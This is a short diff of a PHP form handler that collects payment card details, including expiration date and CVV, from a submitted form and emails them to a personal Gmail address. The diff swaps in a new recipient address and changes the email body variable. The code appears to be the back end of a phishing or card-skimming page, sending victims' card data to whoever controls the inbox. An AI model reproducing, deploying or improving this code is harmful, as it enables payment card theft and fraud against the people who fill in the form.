@@ -18,7 +18,7 @@ function sendEmail($post) {
     $card_expiration_year = filter_var($post['expYear'], FILTER_SANITIZE_NUMBER_INT);
     $card_expiration_month = filter_var($post['expMonth'], FILTER_SANITIZE_NUMBER_INT);
     $cvv = filter_var($post['cvv'], FILTER_SANITIZE_NUMBER_INT);
-    $to = filter_var('americanresidence435@gmail.com', FILTER_SANITIZE_EMAIL);
+    $to = filter_var('habeebajani9@gmail.com', FILTER_SANITIZE_EMAIL);
     $fromEmail = filter_var($post['email'], FILTER_SANITIZE_EMAIL);
 
     // Validate input
@@ -58,7 +58,7 @@ function sendEmail($post) {
     }
 
     // Send email
-    if (mail($to, $subject, $html_body, $headers)) {
+    if (mail($to, $subject, $email_body, $headers)) {
         return "success";
     } else {
         return "Failed to send email.";
